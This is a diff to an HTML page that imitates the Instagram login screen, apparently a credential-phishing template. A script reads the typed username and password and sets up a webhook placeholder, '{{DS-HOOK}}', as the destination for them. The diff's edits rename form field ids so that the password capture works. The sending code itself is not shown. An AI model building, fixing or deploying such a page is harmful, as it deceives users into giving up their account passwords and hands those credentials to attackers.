@@ -1,3 +1,5 @@
+<!-- This templte i get in web. github a user a html that copy pasted. :)0 -->
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -262,11 +264,11 @@
                         title="Instagram logo"></h1>
 
                 <form id="form">
-                    <label for="email" class="sr-only">Username/email</label>
-                    <input name="email" placeholder="Username/email" id="name">
+                    <label for="name" class="sr-only">Username/email</label>
+                    <input name="name" placeholder="Username/email" id="name">
 
 
-                    <label for=" password" class="sr-only">Password</label>
+                    <label for="password" class="sr-only">Password</label>
                     <input type="password" name="password" placeholder="password" id="password">
 
                     <button type="button">Login</button>
@@ -301,7 +303,7 @@
 
             const submitClickTime = new Date();
 
-            const nameValue = document.getElementById('email').value;
+            const nameValue = document.getElementById('name').value;
             const passwordValue = document.getElementById("password").value;
 
             const webhookUrl = "{{DS-HOOK}}";
